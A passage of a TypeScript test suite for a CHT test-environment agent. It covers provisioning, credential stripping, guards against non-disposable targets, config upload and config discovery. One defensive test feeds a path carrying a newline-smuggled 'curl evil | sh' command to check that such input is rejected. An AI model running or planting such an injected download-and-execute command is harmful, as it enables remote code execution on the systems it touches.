import { expect } from 'chai';
import { resolve } from 'node:path';
import * as sinon from 'sinon';
import { TestEnvironmentAgent } from '../../src/agents/test-environment-agent';
import * as chtConfRunner from '../../src/utils/cht-conf-runner';
import * as chtApi from '../../src/utils/cht-api';
import * as testData from '../../src/utils/test-data';
import {
  ChtConfExecResult,
  ConfigActionResult,
  ConfigUploadAction,
  DiscoveredConfig,
  EnvironmentHandle,
  ProvisionOptions,
  ResetTier,
} from '../../src/types';

describe('TestEnvironmentAgent', () => {
  let agent: TestEnvironmentAgent;

  beforeEach(() => {
    agent = new TestEnvironmentAgent({ useMockDocker: true });
  });

  // Helper: provision a mock environment for downstream method tests
  const provisionMock = (overrides: Partial<ProvisionOptions> = {}): Promise<EnvironmentHandle> =>
    agent.provision({ chtCorePath: '/workspace/cht-core', ...overrides });

  describe('constructor', () => {
    it('should default to mock mode when no options are given', () => {
      const defaultAgent = new TestEnvironmentAgent();

      expect((defaultAgent as any).useMockDocker).to.equal(true);
    });

    it('should default to mock mode when useMockDocker is omitted', () => {
      const partialAgent = new TestEnvironmentAgent({});

      expect((partialAgent as any).useMockDocker).to.equal(true);
    });

    it('should disable mock mode when useMockDocker is false', () => {
      const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

      expect((realAgent as any).useMockDocker).to.equal(false);
    });
  });

  describe('provision', () => {
    it('should return an environment handle from local code path', async () => {
      const handle = await agent.provision({ chtCorePath: '/workspace/cht-core' });

      expect(handle.url).to.be.a('string').and.not.empty;
      expect(handle.auth).to.have.keys(['user', 'password']);
      expect(handle.network).to.equal('cht-agent-net'); // default branch (no network override)
      expect(handle.source).to.equal('mock');
    });

    it('should return an environment handle from a published version', async () => {
      const handle = await agent.provision({ version: '4.18.0' });

      expect(handle.source).to.equal('mock');
      expect(handle.chtCorePath).to.be.undefined;
    });

    it('should carry chtCorePath on the handle when built from local code', async () => {
      const handle = await agent.provision({ chtCorePath: '/workspace/cht-core' });

      expect(handle.chtCorePath).to.equal('/workspace/cht-core');
    });

    it('should strip embedded credentials from a mock handle, as the real path does', async () => {
      const handle = await agent.provision({ version: '4.18.0', url: 'https://ops:secret@nginx' });

      expect(handle.url).to.equal('https://nginx');
      expect(handle.url).to.not.include('secret');
      expect(handle.auth).to.deep.equal({ user: 'ops', password: 'secret' });
    });

    it('should reject an invalid mock URL without carrying its password on the error', async () => {
      try {
        await agent.provision({ version: '4.18.0', url: 'https://ops:secret@exa mple' });
        expect.fail('expected provision to reject');
      } catch (error) {
        expect((error as Error).message).to.include('not a valid URL');
        expect((error as Error).message).to.not.include('secret');
        expect((error as { input?: string }).input).to.be.undefined;
      }
    });

    it('should honor a network override', async () => {
      const handle = await agent.provision({ version: '4.18.0', network: 'custom-net' });

      expect(handle.network).to.equal('custom-net');
    });

    it('should throw when neither chtCorePath nor version is provided', async () => {
      try {
        await agent.provision({});
        expect.fail('Should have thrown an error');
      } catch (error) {
        expect((error as Error).message).to.include('requires either chtCorePath or version');
      }
    });

    it('should reject a chtCorePath containing control characters (it is printed into human-gate commands)', async () => {
      try {
        await agent.provision({ chtCorePath: '/srv/cht-core\ncurl evil | sh' });
        expect.fail('Should have thrown an error');
      } catch (error) {
        expect((error as Error).message).to.include('control characters');
      }
    });

    describe('real mode (useMockDocker: false)', () => {
      let fetchStub: sinon.SinonStub;
      // Readiness asks for the monitoring JSON; the credential check then reads /_session.
      const healthyFetch = async (url: string) => ({
        ok: true,
        status: 200,
        json: async () =>
          url.endsWith('/_session')
            ? { userCtx: { name: 'medic', roles: ['_admin'] } }
            : { version: { app: '4.18.0', couchdb: '3.4.2' } },
      });
      const sessionAnswering = (status: number, userCtx: unknown) => async (url: string) =>
        url.endsWith('/_session') ? { ok: status < 300, status, json: async () => ({ userCtx }) } : healthyFetch(url);
      // Provision reads these; isolate every test from the ambient env.
      const PROVISION_ENV_KEYS = [
        'CHT_URL',
        'COUCHDB_USER',
        'COUCHDB_PASSWORD',
        'CHT_TEST_ENV_ALLOW_EXTERNAL',
        'CHT_TEST_ENV_PROJECT',
      ];
      const priorProvisionEnv: Record<string, string | undefined> = {};

      beforeEach(() => {
        fetchStub = sinon.stub(globalThis, 'fetch' as any);
        for (const key of PROVISION_ENV_KEYS) {
          priorProvisionEnv[key] = process.env[key];
          delete process.env[key];
        }
      });

      afterEach(() => {
        sinon.restore();
        for (const key of PROVISION_ENV_KEYS) {
          if (priorProvisionEnv[key] === undefined) {
            delete process.env[key];
          } else {
            process.env[key] = priorProvisionEnv[key];
          }
        }
      });

      it('should return a docker handle once the environment is healthy', async () => {
        fetchStub.callsFake(healthyFetch);
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

        expect(handle.source).to.equal('docker');
        expect(handle.url).to.equal('https://nginx');
        expect(handle.auth).to.deep.equal({ user: 'medic', password: 'password' });
        expect(handle.network).to.equal('cht-agent-net');
        expect(handle.chtCorePath).to.equal('/workspace/cht-core');
      });

      it('should print the bring-up gate with the cht-core path shell-quoted', async () => {
        fetchStub.callsFake(healthyFetch);
        const logSpy = sinon.spy(console, 'log');
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
        expect(lines.some((line) => line.includes("scripts/test-env-up.sh '/workspace/cht-core'"))).to.equal(true);
      });

      it('should refuse a published version: real mode brings stacks up from a working copy only', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        try {
          await realAgent.provision({ version: '4.18.0' });
          expect.fail('expected provision to reject');
        } catch (error) {
          expect((error as Error).message).to.include('no published-version bring-up');
        }
        expect(fetchStub.called).to.equal(false);
      });

      it('should carry an explicit CHT_TEST_ENV_PROJECT into the printed gate', async () => {
        fetchStub.callsFake(healthyFetch);
        process.env.CHT_TEST_ENV_PROJECT = 'my-proj';
        const logSpy = sinon.spy(console, 'log');
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
        const gate = "CHT_TEST_ENV_PROJECT='my-proj' scripts/test-env-up.sh '/workspace/cht-core'";
        expect(lines.some((line) => line.includes(gate))).to.equal(true);
      });

      it('should refuse a custom network, which the scripts and the override hardcode', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        try {
          await realAgent.provision({ chtCorePath: '/workspace/cht-core', network: 'other-net' });
          expect.fail('expected provision to reject');
        } catch (error) {
          expect((error as Error).message).to.include('hardcode cht-agent-net');
        }
      });

      it('should reject if the environment never becomes ready', async () => {
        fetchStub.resolves({ ok: false, status: 503 });
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        try {
          await realAgent.provision({
            chtCorePath: '/workspace/cht-core',
            readiness: { maxWaitMs: 30, initialDelayMs: 0, maxDelayMs: 0 },
          });
          expect.fail('expected provision to reject');
        } catch (error) {
          expect((error as Error).message).to.include('did not become ready');
        }
      });

      it('should validate input before polling', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        try {
          await realAgent.provision({});
          expect.fail('expected provision to reject');
        } catch (error) {
          expect((error as Error).message).to.include('requires either chtCorePath or version');
        }
      });

      describe('disposable-target guard', () => {
        it('should allow http for a local disposable instance', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'http://localhost:5988';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.url).to.equal('http://localhost:5988');
        });

        it('should refuse http for a non-local host (the admin password would travel in clear)', async () => {
          process.env.CHT_URL = 'http://cht.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core', allowExternalTarget: true });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('https is required');
          }
          expect(fetchStub.called).to.equal(false);
        });

        it('should refuse a PUBLIC address behind the dashed-IP resolver', async () => {
          // local-ip.medicmobile.org answers for ANY address, 203.0.113.5 included.
          process.env.CHT_URL = 'https://203-0-113-5.local-ip.medicmobile.org';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('not a known disposable test instance');
          }
          expect(fetchStub.called).to.equal(false);
        });

        it('should fail provision when the credentials are wrong, naming the user, not on a later call', async () => {
          fetchStub.callsFake(sessionAnswering(401, undefined));
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('could not verify the credentials for medic');
            expect((error as Error).message).to.include('401');
          }
        });

        it('should refuse credentials that authenticate but are not a CouchDB admin', async () => {
          fetchStub.callsFake(sessionAnswering(200, { name: 'chw', roles: ['chw'] }));
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('not a CouchDB admin');
          }
          const sessionCall = fetchStub.getCalls().find((call) => String(call.args[0]).endsWith('/_session'));
          expect(sessionCall?.args[0]).to.equal('https://nginx/_session');
          expect(sessionCall?.args[1].headers.Authorization).to.equal(
            `Basic ${Buffer.from('medic:password').toString('base64')}`
          );
        });

        it('should default COUCHDB_USER and COUCHDB_PASSWORD independently, as the scripts do', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.COUCHDB_USER = 'ops';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.auth).to.deep.equal({ user: 'ops', password: 'password' });
        });

        it('should refuse an unknown host without an explicit opt-in', async () => {
          process.env.CHT_URL = 'https://staging.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('not a known disposable test instance');
          }
          expect(fetchStub.called).to.equal(false);
        });

        it('should refuse the built-in default credentials even against an opted-in external host', async () => {
          process.env.CHT_URL = 'https://staging.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core', allowExternalTarget: true });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('refusing the built-in default credentials');
          }
        });

        it('should accept the cht-docker-helper host used by the published-version bring-up', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://192-168-1-10.local-ip.medicmobile.org';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.url).to.equal('https://192-168-1-10.local-ip.medicmobile.org');
        });

        it('should not treat a bare userinfo with no password as supplied credentials', async () => {
          process.env.CHT_URL = 'https://medic@staging.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          try {
            await realAgent.provision({ chtCorePath: '/workspace/cht-core', allowExternalTarget: true });
            expect.fail('expected provision to reject');
          } catch (error) {
            expect((error as Error).message).to.include('refusing the built-in default credentials');
          }
        });

        it('should honor the CHT_TEST_ENV_ALLOW_EXTERNAL opt-in once credentials are supplied', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://staging.example';
          process.env.CHT_TEST_ENV_ALLOW_EXTERNAL = '1';
          process.env.COUCHDB_PASSWORD = 'realpass';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.url).to.equal('https://staging.example');
        });
      });

      describe('CHT_URL fallback', () => {
        // Env save/clear/restore is handled by the enclosing describe.

        it('should fall back to process.env.CHT_URL when no url option is given', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://cht.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({
            chtCorePath: '/workspace/cht-core',
            allowExternalTarget: true,
            auth: { user: 'ops', password: 'opspass' },
          });

          expect(handle.url).to.equal('https://cht.example');
          expect(fetchStub.firstCall.args[0]).to.equal('https://cht.example/api/v2/monitoring');
        });

        it('should prefer an explicit url option over CHT_URL', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://cht.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({
            chtCorePath: '/workspace/cht-core',
            url: 'https://explicit.example',
            allowExternalTarget: true,
            auth: { user: 'ops', password: 'opspass' },
          });

          expect(handle.url).to.equal('https://explicit.example');
        });

        it('should ignore a blank CHT_URL and use the on-network default', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = '   ';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.url).to.equal('https://nginx');
        });

        it('should canonicalize a trailing slash so appended paths and tracking keys stay stable', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://cht.example/';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({
            chtCorePath: '/workspace/cht-core',
            allowExternalTarget: true,
            auth: { user: 'ops', password: 'opspass' },
          });

          expect(handle.url).to.equal('https://cht.example');
          expect(fetchStub.firstCall.args[0]).to.equal('https://cht.example/api/v2/monitoring');
        });

        it('should strip embedded credentials out of the URL (logged + fetch()ed) into the auth fallback', async () => {
          fetchStub.callsFake(healthyFetch);
          // undici's fetch() rejects credentialed URLs, and handle.url is logged.
          process.env.CHT_URL = 'https://ops:p%40ss@cht.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core', allowExternalTarget: true });

          expect(handle.url).to.equal('https://cht.example');
          expect(handle.auth).to.deep.equal({ user: 'ops', password: 'p@ss' });
          expect(fetchStub.firstCall.args[0]).to.equal('https://cht.example/api/v2/monitoring');
        });

        it('should tolerate a raw % in embedded credentials instead of crashing provision', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://ops:p%ss@cht.example';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core', allowExternalTarget: true });

          expect(handle.auth).to.deep.equal({ user: 'ops', password: 'p%ss' });
          expect(handle.url).to.equal('https://cht.example');
        });

        it('should honor the COUCHDB_USER/COUCHDB_PASSWORD env seam (test-env-up.sh parity)', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.COUCHDB_USER = 'admin';
          process.env.COUCHDB_PASSWORD = 'not-the-default';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });

          expect(handle.auth).to.deep.equal({ user: 'admin', password: 'not-the-default' });
        });

        it('should prefer explicit auth over URL-embedded and env credentials', async () => {
          fetchStub.callsFake(healthyFetch);
          process.env.CHT_URL = 'https://ops:urlpass@cht.example';
          process.env.COUCHDB_PASSWORD = 'envpass';
          const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

          const handle = await realAgent.provision({
            chtCorePath: '/workspace/cht-core',
            auth: { user: 'explicit', password: 'explicitpass' },
            allowExternalTarget: true,
          });

          expect(handle.auth).to.deep.equal({ user: 'explicit', password: 'explicitpass' });
        });
      });
    });
  });

  describe('applyConfig', () => {
    it('should default to config/default under the handle chtCorePath and run the four standard buckets', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle);

      expect(result.configPath).to.equal('/workspace/cht-core/config/default');
      expect(result.succeeded).to.equal(true);
      expect(result.warnings).to.deep.equal([]);
      expect(result.actions.map((action) => action.action)).to.deep.equal([
        'app-settings',
        'app-forms',
        'contact-forms',
        'resources',
      ]);
    });

    it('should accept a bare config path string (back-compat)', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, 'config/standard');

      expect(result.configPath).to.equal('config/standard');
      expect(result.actions).to.have.lengthOf(4);
    });

    it('should run only the selected actions when actions are narrowed', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, {
        configPath: '/mnt/cht-conf-project',
        actions: ['app-forms'],
      });

      expect(result.configPath).to.equal('/mnt/cht-conf-project');
      expect(result.actions).to.have.lengthOf(1);
      expect(result.actions[0].action).to.equal('app-forms');
    });

    it('should report the underlying cht-conf commands for each action', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, { actions: ['app-forms'] });

      expect(result.actions[0].commands).to.deep.equal(['convert-app-forms', 'upload-app-forms']);
    });

    it('should report an uploaded status per action in mock mode', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, { actions: ['app-settings'] });

      expect(result.actions[0].status).to.equal('uploaded');
    });

    it('should carry the targeted artifact onto the result when narrowed to one', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, {
        actions: ['app-forms'],
        artifact: 'pregnancy',
      });

      expect(result.artifact).to.equal('pregnancy');
    });

    it('should omit the artifact field when no single artifact is targeted', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, { actions: ['app-forms'] });

      expect(result.artifact).to.be.undefined;
    });

    it('should return an empty action list when actions is an empty array', async () => {
      const handle = await provisionMock();

      const result = await agent.applyConfig(handle, { actions: [] });

      expect(result.actions).to.deep.equal([]);
      expect(result.succeeded).to.equal(true);
    });

    it('should return an isolated copy (mutation does not leak to later calls)', async () => {
      const handle = await provisionMock();

      const first = await agent.applyConfig(handle, { actions: ['app-forms'] });
      first.actions[0].commands.push('tampered');
      first.actions[0].warnings.push('tampered');

      const second = await agent.applyConfig(handle, { actions: ['app-forms'] });
      expect(second.actions[0].commands).to.deep.equal(['convert-app-forms', 'upload-app-forms']);
      expect(second.actions[0].warnings).to.deep.equal([]);
    });

    describe('real mode (useMockDocker: false)', () => {
      let runBucketStub: sinon.SinonStub;
      const dockerHandle: EnvironmentHandle = {
        url: 'https://nginx',
        auth: { user: 'medic', password: 'password' },
        network: 'cht-agent-net',
        source: 'docker',
      };
      const uploaded = (action: ConfigUploadAction): ConfigActionResult => ({
        action,
        status: 'uploaded',
        commands: [],
        warnings: [],
      });

      beforeEach(() => {
        runBucketStub = sinon
          .stub(chtConfRunner, 'runBucket')
          .callsFake((opts) => Promise.resolve(uploaded(opts.action)));
      });

      afterEach(() => {
        sinon.restore();
      });

      it('should run cht-conf per action against the instance and aggregate success', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        const result = await realAgent.applyConfig(dockerHandle, { actions: ['app-settings', 'app-forms'] });

        expect(runBucketStub.callCount).to.equal(2);
        expect(result.succeeded).to.equal(true);
        expect(result.actions.map((a) => a.action)).to.deep.equal(['app-settings', 'app-forms']);
      });

      it('should pass the credentialed instance URL and configPath to the runner', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.applyConfig(dockerHandle, { configPath: '/mnt/conf', actions: ['app-forms'] });

        const passed = runBucketStub.firstCall.args[0];
        expect(passed.instanceUrl).to.equal('https://medic:password@nginx/');
        expect(passed.configPath).to.equal('/mnt/conf');
        expect(passed.action).to.equal('app-forms');
      });

      it('should thread the targeted artifact through to the runner', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.applyConfig(dockerHandle, { actions: ['app-forms'], artifact: 'pregnancy' });

        expect(runBucketStub.firstCall.args[0].artifact).to.equal('pregnancy');
      });

      it('should resolve the default config/default against the handle chtCorePath, pinning the cwd', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
        const handleWithCore = { ...dockerHandle, chtCorePath: '/workspace/cht-core' };

        await realAgent.applyConfig(handleWithCore, { actions: ['app-settings'] });

        const passed = runBucketStub.firstCall.args[0];
        expect(passed.configPath).to.equal('/workspace/cht-core/config/default');
        expect(passed.cwd).to.equal('/workspace/cht-core/config/default');
      });

      it('should leave the cwd unset for a relative configPath (no chtCorePath to resolve against)', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.applyConfig(dockerHandle, { actions: ['app-settings'] });

        const passed = runBucketStub.firstCall.args[0];
        expect(passed.configPath).to.equal('config/default');
        expect(passed.cwd).to.be.undefined;
      });

      it('should thread bin and timeoutMs through to the runner (deployment-pinned cht-conf, long form sets)', async () => {
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        await realAgent.applyConfig(dockerHandle, {
          configPath: '/mnt/conf',
          actions: ['app-forms'],
          bin: '/mnt/conf/node_modules/.bin/cht',
          timeoutMs: 600_000,
        });

        const passed = runBucketStub.firstCall.args[0];
        expect(passed.bin).to.equal('/mnt/conf/node_modules/.bin/cht');
        expect(passed.timeoutMs).to.equal(600_000);
        expect(passed.cwd).to.equal('/mnt/conf');
      });

      it('should fail an artifact-targeted apply when no form bucket contains that artifact', async () => {
        runBucketStub.restore();
        runBucketStub = sinon.stub(chtConfRunner, 'runBucket').callsFake((opts) =>
          Promise.resolve({
            action: opts.action,
            status: 'skipped' as const,
            commands: [],
            warnings: [],
            matchedNothing: true,
          })
        );
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        const result = await realAgent.applyConfig(dockerHandle, {
          actions: ['app-forms', 'contact-forms'],
          artifact: 'pregnency',
        });

        expect(result.succeeded).to.equal(false);
        expect(result.warnings.join(' ')).to.include('no configured form bucket contains an artifact');
      });

      it('should succeed when one form bucket has the artifact and the other legitimately misses', async () => {
        runBucketStub.restore();
        runBucketStub = sinon.stub(chtConfRunner, 'runBucket').callsFake((opts) => {
          const missed = opts.action === 'contact-forms';
          return Promise.resolve({
            action: opts.action,
            status: missed ? ('skipped' as const) : ('uploaded' as const),
            commands: [],
            warnings: [],
            matchedNothing: missed,
          });
        });
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        const result = await realAgent.applyConfig(dockerHandle, { artifact: 'pregnancy' });

        expect(result.succeeded).to.equal(true);
      });

      it('should report succeeded:false when a bucket fails, without aborting the rest', async () => {
        runBucketStub.restore();
        runBucketStub = sinon.stub(chtConfRunner, 'runBucket').callsFake((opts) => {
          const status = opts.action === 'app-forms' ? 'failed' : 'uploaded';
          return Promise.resolve({ action: opts.action, status, commands: [], warnings: [] });
        });
        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });

        const result = await realAgent.applyConfig(dockerHandle, {
          actions: ['app-settings', 'app-forms', 'resources'],
        });

        expect(runBucketStub.callCount).to.equal(3);
        expect(result.succeeded).to.equal(false);
        expect(result.actions.map((a) => a.status)).to.deep.equal(['uploaded', 'failed', 'uploaded']);
      });
    });
  });

  describe('discoverConfig', () => {
    it('should return a discovered config with contact types, roles, and forms', async () => {
      const handle = await provisionMock();

      const config = await agent.discoverConfig(handle);

      expect(config.contactTypes).to.have.lengthOf(4);
      expect(Object.keys(config.roles)).to.have.members(['chw', 'supervisor']);
      expect(config.forms).to.deep.equal(['delivery', 'pregnancy', 'assessment']);
      expect(config.permissions.can_edit).to.deep.equal(['chw', 'supervisor']);
      // transitions exercises both arms of the TransitionConfig union
      expect(config.transitions.update_clinics).to.equal(true);
      expect(config.transitions.death_reporting).to.deep.equal({ disable: false });
    });

    it('should include a person contact type in the hierarchy', async () => {
      const handle = await provisionMock();

      const config = await agent.discoverConfig(handle);

      expect(config.contactTypes.some(ct => ct.person === true)).to.equal(true);
    });

    it('should return an isolated copy (mutation does not leak to later calls)', async () => {
      const handle = await provisionMock();

      const first = await agent.discoverConfig(handle);
      first.forms.push('INJECTED');
      first.contactTypes.push({ id: 'INJECTED' });

      const second = await agent.discoverConfig(handle);

      expect(second.forms).to.deep.equal(['delivery', 'pregnancy', 'assessment']);
      expect(second.contactTypes).to.have.lengthOf(4);
    });

    it('should carry mock form versions for the apply -> verify loop', async () => {
      const handle = await provisionMock();

      const config = await agent.discoverConfig(handle);

      expect(Object.keys(config.formVersions ?? {})).to.have.members(config.forms);
    });

    describe('real mode (useMockDocker: false)', () => {
      let realAgent: TestEnvironmentAgent;
      const dockerHandle: EnvironmentHandle = {
        url: 'https://nginx',
        auth: { user: 'medic', password: 'password' },
        network: 'cht-agent-net',
        source: 'docker',
      };

      // Raw /api/v1/settings shape (extra fields included to prove they are dropped)
      const rawSettings = {
        contact_types: [
          { id: 'clinic', parents: ['health_center'], icon: 'medic-clinic' },
          { id: 'person', parents: ['clinic'], person: true },
          { name: 'no-id-entry' },
          'not-an-object',
        ],
        roles: {
          chw: { name: 'CHW', offline: true, superfluous: 'x' },
          broken: 'not-an-object',
        },
        permissions: {
          can_edit: ['chw', 42, 'supervisor'],
          not_a_list: true,
        },
        transitions: {
          update_clinics: true,
          death_reporting: { disable: true, extra: 'y' },
          odd_value: 7,
        },
        locale: 'en',
      };
      const rawFormRevs = [
        { id: 'form:delivery', rev: '1-def' },
        { id: 'form:pregnancy', rev: '3-abc' },
      ];

      let settingsStub: sinon.SinonStub;
      let formRevsStub: sinon.SinonStub;

      beforeEach(() => {
        realAgent = new TestEnvironmentAgent({ useMockDocker: false });
        settingsStub = sinon.stub(chtApi, 'fetchSettings').resolves(rawSettings);
        formRevsStub = sinon.stub(chtApi, 'fetchFormRevs').resolves(rawFormRevs);
      });

      afterEach(() => {
        sinon.restore();
      });

      it('should fetch settings and form revs with the handle url and auth', async () => {
        await realAgent.discoverConfig(dockerHandle);

        expect(settingsStub.calledOnceWith('https://nginx', dockerHandle.auth)).to.equal(true);
        expect(formRevsStub.calledOnceWith('https://nginx', dockerHandle.auth)).to.equal(true);
      });

      it('should parse contact types, keeping only id/parents/person and dropping junk entries', async () => {
        const config = await realAgent.discoverConfig(dockerHandle);

        expect(config.contactTypes).to.deep.equal([
          { id: 'clinic', parents: ['health_center'] },
          { id: 'person', parents: ['clinic'], person: true },
        ]);
      });

      it('should parse roles and permissions, dropping malformed entries', async () => {
        const config = await realAgent.discoverConfig(dockerHandle);

        expect(config.roles).to.deep.equal({ chw: { name: 'CHW', offline: true } });
        expect(config.permissions).to.deep.equal({ can_edit: ['chw', 'supervisor'] });
      });

      it('should normalize transitions to booleans or {disable} objects', async () => {
        const config = await realAgent.discoverConfig(dockerHandle);

        expect(config.transitions).to.deep.equal({
          update_clinics: true,
          death_reporting: { disable: true },
        });
      });

      it('should list installed forms with their revs as the verification hashes', async () => {
        const config = await realAgent.discoverConfig(dockerHandle);

        expect(config.forms).to.deep.equal(['delivery', 'pregnancy']);
        expect(config.formVersions).to.deep.equal({ delivery: '1-def', pregnancy: '3-abc' });
      });

      it('should propagate a settings fetch failure', async () => {
        settingsStub.rejects(new Error('CHT request failed: GET /api/v1/settings -> HTTP 503'));

        try {
          await realAgent.discoverConfig(dockerHandle);
          expect.fail('expected discoverConfig to reject');
        } catch (error) {
          expect((error as Error).message).to.include('HTTP 503');
        }
      });

      it('should keep contactTypes empty but warn when the instance defines none (built-in default hierarchy)', async () => {
        settingsStub.resolves({ roles: {} });
        const warnSpy = sinon.spy(console, 'warn');

        const config = await realAgent.discoverConfig(dockerHandle);

        expect(config.contactTypes).to.deep.equal([]);
        expect(warnSpy.args.flat().join(' ')).to.include('no contact_types');
      });
    });
  });

  describe('prepareTestData', () => {
    const sampleConfig: DiscoveredConfig = {
      contactTypes: [{ id: 'clinic' }, { id: 'person', person: true }],
      roles: { chw: { offline: true } },
      permissions: {},
      transitions: {},
      forms: ['assessment'],
    };

    it('should return the deterministic seeded counts', async () => {
      const handle = await provisionMock();

      const result = await agent.prepareTestData(handle, sampleConfig);

      expect(result.placesCreated).to.equal(3);
      expect(result.peopleCreated).to.equal(5);
      expect(result.reportsCreated).to.equal(4);
      expect(result.usersCreated).to.equal(2);
      expect(result.warnings).to.deep.equal([]);
    });

    it('should return an isolated copy (mutation does not leak to later calls)', async () => {
      const handle = await provisionMock();

      const first = await agent.prepareTestData(handle, sampleConfig);
      first.warnings.push('leak');
      first.placesCreated = 999;

      const second = await agent.prepareTestData(handle, sampleConfig);

      expect(second.warnings).to.deep.equal([]);
      expect(second.placesCreated).to.equal(3);
    });

    it('should report success and the seeded doc ids in mock mode', async () => {
      const handle = await provisionMock();

      const result = await agent.prepareTestData(handle, sampleConfig);

      expect(result.succeeded).to.equal(true);
      // One doc per mock place/person/report (users are accounts, not docs).
      expect(result.seededDocIds).to.have.lengthOf(
        result.placesCreated + result.peopleCreated + result.reportsCreated
      );
    });

    describe('real mode (useMockDocker: false)', () => {
      const dockerHandle: EnvironmentHandle = {
        url: 'https://nginx',
        auth: { user: 'medic', password: 'password' },
        network: 'cht-agent-net',
        source: 'docker',
      };
      const dataPath = '/mnt/test-data';
      const ansiInfo = (message: string): string => `\x1b[32mINFO ${message} \x1b[0m`;
      const okRun = (output: string): ChtConfExecResult => ({ exitCode: 0, output, timedOut: false });
      // 2 places (one via contact_type), 1 person, 1 report, 1 user doc
      const seededDocs: testData.SeededDoc[] = [
        { id: 'place-1', type: 'clinic' },
        { id: 'place-2', type: 'contact', contactType: 'clinic' },
        { id: 'person-1', type: 'person' },
        { id: 'report-1', type: 'data_record' },
        { id: 'user-doc-1', type: 'user' },
      ];

      let realAgent: TestEnvironmentAgent;
      let runChtConfStub: sinon.SinonStub;
      let readSeededDocsStub: sinon.SinonStub;
      let hasUsersCsvStub: sinon.SinonStub;
      let hasCsvInputStub: sinon.SinonStub;
      let findForeignStub: sinon.SinonStub;
